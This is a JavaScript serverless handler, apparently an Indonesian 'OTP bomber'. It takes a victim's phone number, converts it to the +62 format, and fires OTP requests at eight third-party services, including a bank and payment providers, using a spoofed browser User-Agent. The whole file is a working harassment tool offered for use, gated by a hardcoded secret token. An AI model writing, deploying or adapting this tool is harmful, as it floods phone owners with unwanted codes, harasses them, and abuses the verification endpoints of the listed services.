export default async function handler(req, res) {
    // Set CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    
    // Cek Token FloX (Opsional, biar sama kayak FloX)
    const token = req.headers['x-paradox-token'];
    if (token !== 'PARADOX_SUPER_SECRET_998877') {
        return res.status(401).json({ error: 'Unauthorized: Token Invalid' });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { action, phone } = req.body;
    if (action !== 'request_otp' || !phone) {
        return res.status(400).json({ error: 'Bad Request: Invalid format' });
    }

    let nomor = phone;
    if (nomor.startsWith('0')) nomor = '62' + nomor.slice(1);

    const endpoints = [
        "https://api.bri.co.id/v1/otp",
        "https://api.misteraladin.com/v1/otp",
        "https://api.kitabisa.com/v1/otp/send",
        "https://api.fore.coffee/api/v1/auth/otp",
        "https://api.janji.co.id/v1/auth/send-otp",
        "https://api.uwu.id/v1/auth/register",
        "https://api.ayoconnect.com/v1/otp",
        "https://api.espay.id/v1/otp"
    ];

    let results = [];
    for (let url of endpoints) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
                body: JSON.stringify({ phone: nomor, msisdn: nomor, phone_number: nomor })
            });
            results.push({ url, status: response.status });
        } catch (e) {
            results.push({ url, status: 'error' });
        }
    }

    return res.status(200).json({ 
        status: true,
        message: 'OTP successfully sent',
        results: results
    });
}
